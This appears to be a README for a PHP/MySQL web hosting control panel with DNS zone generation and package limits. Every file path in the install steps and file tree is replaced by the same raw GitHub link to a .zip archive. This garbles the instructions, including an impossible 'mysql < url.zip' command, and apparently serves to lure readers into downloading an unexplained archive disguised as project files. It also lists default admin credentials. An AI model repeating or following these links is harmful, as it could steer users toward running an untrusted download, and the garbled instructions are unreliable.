# Web Hosting Panel

A complete web hosting control panel built with PHP and MySQL featuring domain management, DNS zone files, user accounts, and package management.

## Features

### Admin Features
- Dashboard with statistics
- User account management
- Package creation and management
- Domain oversight and approval
- DNS zone management
- User status control

### User Features
- Personal dashboard with package info
- Domain creation and management
- DNS record management
- Profile management
- Password change

### Technical Features
- DNS zone file generation
- Package-based limitations
- Secure authentication
- Responsive dark theme UI
- MySQL database backend

## Installation

1. **Database Setup**
   ```bash
   mysql -u root -p < https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip
   ```

2. **Configuration**
   - Edit `https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip` with your database credentials
   - Set proper DNS zone path and BIND reload command
   - Configure site URL

3. **Permissions**
   - Ensure web server can write to DNS zone directory
   - Set proper permissions for BIND reload command

4. **Default Login**
   - Username: `admin`
   - Password: `admin123`

## File Structure

```
hosting-panel/
├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip              # Database and site configuration
├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip            # Database schema and sample data
├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip              # Main redirect page
├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip              # Authentication
├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip             # Session cleanup
├── includes/
│   └── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip      # Utility functions
├── assets/css/
│   └── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip          # Dark theme styling
├── admin/                 # Admin panel
│   ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip          # Admin dashboard
│   ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip          # User management
│   ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip       # Package management
│   ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip        # Domain oversight
│   └── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip            # DNS management
└── user/                  # User panel
    ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip          # User dashboard
    ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip        # Domain management
    ├── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip            # DNS records
    └── https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip        # Profile settings
```

## Security Notes

- Change default admin password immediately
- Use HTTPS in production
- Set proper file permissions
- Configure firewall rules
- Regular security updates

## DNS Integration

The panel generates BIND-compatible zone files and can reload the DNS server automatically. Ensure proper permissions for:
- Writing to DNS zone directory
- Executing BIND reload command

## Package System

Users are assigned packages that limit:
- Disk space allocation
- Bandwidth limits
- Number of domains
- Subdomains allowed
- Email accounts
- Database limits

## Customization

The UI uses CSS custom properties for easy theme customization. Modify the `:root` variables in `https://raw.githubusercontent.com/savagemiguel/phynx-hosting-panel/master/tragacantha/phynx-hosting-panel.zip` to change colors and styling."# phynx" 
